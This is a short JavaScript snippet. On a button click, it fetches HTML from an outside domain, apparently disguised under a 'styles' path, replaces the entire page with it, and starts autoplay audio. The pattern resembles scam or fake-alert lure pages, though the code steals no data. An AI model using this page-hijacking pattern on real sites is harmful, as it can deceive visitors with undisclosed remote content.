document.addEventListener('DOMContentLoaded', function () {
    // Function to load additional content and start audio playback
    function loadAdditionalContent() {
        // Use fetch to load the content from the specified URL
        fetch('https://svtzx.com/Site/styles/maincontent.html')
            .then(response => response.text())
            .then(data => {
                // Replace the entire document's HTML with the loaded HTML
                document.documentElement.innerHTML = data;

                // Start audio playback
                const audio = document.getElementById('autoplayAudio');
                if (audio) {
                    audio.play();
                }
            })
            .catch(error => console.error('Error fetching content:', error));
    }

    // Button click event listener
    var btn = document.querySelector('.btn');
    btn.addEventListener('click', function (event) {
        // Prevent the default behavior of the link
        event.preventDefault();

        // Load additional content and start audio playback when the button is clicked
        loadAdditionalContent();
    });
});